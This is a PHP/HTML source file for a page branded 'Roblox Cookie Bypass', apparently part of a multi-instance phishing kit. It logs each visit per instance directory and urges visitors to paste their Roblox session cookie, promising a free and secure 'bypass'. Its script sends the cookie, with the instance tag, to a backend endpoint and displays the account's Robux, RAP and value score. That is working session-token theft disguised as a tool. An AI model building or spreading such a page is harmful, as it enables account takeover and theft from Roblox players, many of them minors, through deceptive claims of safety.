<?php
require_once '../config.php';
require_once '../functions.php';

// Get directory from URL
$directory = $_GET['dir'] ?? '';

if (empty($directory)) {
    http_response_code(400);
    die('Invalid request');
}

// Verify instance exists
$instanceData = getInstanceData($directory);
if (!$instanceData) {
    http_response_code(404);
    die('Instance not found');
}

// Track visit
trackVisit($directory);

// Get domain info
$domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$apiUrl = "$protocol://$domain/api/bypass.php";
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Bypass - Free & Safe</title>
    <meta name="description" content="Bypass Roblox cookies instantly - Fast, secure, and 100% free">
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --primary: #8b5cf6;
            --primary-dark: #7c3aed;
            --primary-light: #a78bfa;
            --dark: #0f172a;
            --darker: #0a0e1a;
            --light: #f8fafc;
            --gray: #94a3b8;
            --success: #10b981;
            --error: #ef4444;
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            --glass: rgba(30, 41, 59, 0.5);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background-color: var(--darker);
            color: var(--light);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-image: 
                radial-gradient(at 80% 0%, rgba(139, 92, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
            background-attachment: fixed;
            padding: 20px;
        }

        .bypass-container {
            width: 100%;
            max-width: 600px;
        }

        .bypass-card {
            background: var(--glass);
            backdrop-filter: blur(20px);
            border-radius: 16px;
            padding: 40px;
            border: 1px solid var(--glass-border);
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
        }

        .bypass-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .bypass-icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 36px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% {
                transform: scale(1);
                box-shadow: 0 0 0 0 rgba(139, 92, 246, 0.7);
            }
            50% {
                transform: scale(1.05);
                box-shadow: 0 0 0 20px rgba(139, 92, 246, 0);
            }
        }

        .bypass-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(90deg, var(--primary-light), var(--primary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .bypass-subtitle {
            color: var(--gray);
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 500;
            color: var(--gray);
        }

        .textarea-wrapper {
            position: relative;
        }

        .form-textarea {
            width: 100%;
            min-height: 120px;
            padding: 12px 16px;
            background: rgba(30, 41, 59, 0.5);
            border: 1px solid var(--glass-border);
            border-radius: 8px;
            color: var(--light);
            font-family: 'Poppins', sans-serif;
            font-size: 13px;
            resize: vertical;
            transition: var(--transition);
        }

        .form-textarea:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.2);
        }

        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: var(--transition);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(139, 92, 246, 0.4);
        }

        .submit-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .features {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 30px;
        }

        .feature {
            text-align: center;
            padding: 15px;
            background: rgba(30, 41, 59, 0.3);
            border-radius: 8px;
            border: 1px solid var(--glass-border);
        }

        .feature-icon {
            font-size: 24px;
            margin-bottom: 8px;
            color: var(--primary-light);
        }

        .feature-text {
            font-size: 12px;
            color: var(--gray);
        }

        .result-card {
            display: none;
            margin-top: 20px;
            padding: 20px;
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            border-radius: 8px;
        }

        .result-card.show {
            display: block;
        }

        .result-header {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .result-avatar {
            width: 50px;
            height: 50px;
            border-radius: 50%;
            border: 2px solid var(--success);
        }

        .result-info h3 {
            font-size: 16px;
            margin-bottom: 4px;
        }

        .result-info p {
            font-size: 13px;
            color: var(--gray);
        }

        .result-stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-top: 15px;
        }

        .result-stat {
            text-align: center;
            padding: 10px;
            background: rgba(30, 41, 59, 0.5);
            border-radius: 6px;
        }

        .result-stat-value {
            font-size: 18px;
            font-weight: 600;
            color: var(--primary-light);
        }

        .result-stat-label {
            font-size: 11px;
            color: var(--gray);
            margin-top: 4px;
        }

        @media (max-width: 768px) {
            .features {
                grid-template-columns: 1fr;
            }

            .result-stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <div class="bypass-container">
        <div class="bypass-card">
            <div class="bypass-header">
                <div class="bypass-icon">
                    <i class="fas fa-cookie-bite"></i>
                </div>
                <h1 class="bypass-title">Roblox Cookie Bypass</h1>
                <p class="bypass-subtitle">Instant, secure, and completely free</p>
            </div>

            <form id="bypassForm">
                <div class="form-group">
                    <label class="form-label">Paste Your Roblox Cookie</label>
                    <div class="textarea-wrapper">
                        <textarea 
                            class="form-textarea" 
                            id="cookieInput"
                            placeholder="_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_..."
                            required
                        ></textarea>
                    </div>
                </div>

                <button type="submit" class="submit-btn" id="submitBtn">
                    <i class="fas fa-rocket"></i>
                    <span>Bypass Cookie</span>
                </button>
            </form>

            <div class="result-card" id="resultCard">
                <div class="result-header">
                    <img src="" alt="Avatar" class="result-avatar" id="resultAvatar">
                    <div class="result-info">
                        <h3 id="resultUsername">Username</h3>
                        <p id="resultDetails">Details</p>
                    </div>
                </div>
                <div class="result-stats">
                    <div class="result-stat">
                        <div class="result-stat-value" id="resultRobux">0</div>
                        <div class="result-stat-label">Robux</div>
                    </div>
                    <div class="result-stat">
                        <div class="result-stat-value" id="resultRAP">0</div>
                        <div class="result-stat-label">RAP</div>
                    </div>
                    <div class="result-stat">
                        <div class="result-stat-value" id="resultScore">0</div>
                        <div class="result-stat-label">Score</div>
                    </div>
                </div>
            </div>

            <div class="features">
                <div class="feature">
                    <div class="feature-icon"><i class="fas fa-bolt"></i></div>
                    <div class="feature-text">Instant Bypass</div>
                </div>
                <div class="feature">
                    <div class="feature-icon"><i class="fas fa-shield-alt"></i></div>
                    <div class="feature-text">100% Secure</div>
                </div>
                <div class="feature">
                    <div class="feature-icon"><i class="fas fa-gift"></i></div>
                    <div class="feature-text">Always Free</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const form = document.getElementById('bypassForm');
        const submitBtn = document.getElementById('submitBtn');
        const cookieInput = document.getElementById('cookieInput');
        const resultCard = document.getElementById('resultCard');

        form.addEventListener('submit', async function(e) {
            e.preventDefault();

            const cookie = cookieInput.value.trim();

            if (!cookie) {
                Swal.fire({
                    title: 'Error',
                    text: 'Please enter a cookie',
                    icon: 'error',
                    background: '#0f172a',
                    color: '#f8fafc',
                    confirmButtonColor: '#ef4444'
                });
                return;
            }

            // Hide result card
            resultCard.classList.remove('show');

            // Disable button
            submitBtn.disabled = true;
            submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>Bypassing...</span>';

            try {
                const response = await fetch('<?php echo $apiUrl; ?>', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        cookie: cookie,
                        directory: '<?php echo htmlspecialchars($directory); ?>'
                    })
                });

                const data = await response.json();

                if (data.success) {
                    // Show result card
                    document.getElementById('resultAvatar').src = data.avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image/default.png';
                    document.getElementById('resultUsername').textContent = data.userInfo.username || 'Unknown';
                    document.getElementById('resultDetails').textContent = `Premium: ${data.userInfo.premium} • Voice: ${data.userInfo.voiceChat}`;
                    document.getElementById('resultRobux').textContent = data.userInfo.robux ? data.userInfo.robux.toLocaleString() : '0';
                    document.getElementById('resultRAP').textContent = data.userInfo.rap ? data.userInfo.rap.toLocaleString() : '0';
                    document.getElementById('resultScore').textContent = data.userInfo.accountScore || '0';
                    
                    resultCard.classList.add('show');

                    Swal.fire({
                        title: 'Success!',
                        text: 'Cookie bypassed successfully! Check the results below.',
                        icon: 'success',
                        background: '#0f172a',
                        color: '#f8fafc',
                        confirmButtonColor: '#10b981'
                    });

                    // Clear input
                    cookieInput.value = '';
                } else {
                    Swal.fire({
                        title: 'Bypass Failed',
                        text: data.error || 'Failed to bypass cookie. Please check your cookie and try again.',
                        icon: 'error',
                        background: '#0f172a',
                        color: '#f8fafc',
                        confirmButtonColor: '#ef4444'
                    });
                }
            } catch (error) {
                console.error('Error:', error);
                Swal.fire({
                    title: 'Error',
                    text: 'An error occurred. Please try again.',
                    icon: 'error',
                    background: '#0f172a',
                    color: '#f8fafc',
                    confirmButtonColor: '#ef4444'
                });
            } finally {
                // Re-enable button
                submitBtn.disabled = false;
                submitBtn.innerHTML = '<i class="fas fa-rocket"></i><span>Bypass Cookie</span>';
            }
        });
    </script>
</body>
</html>
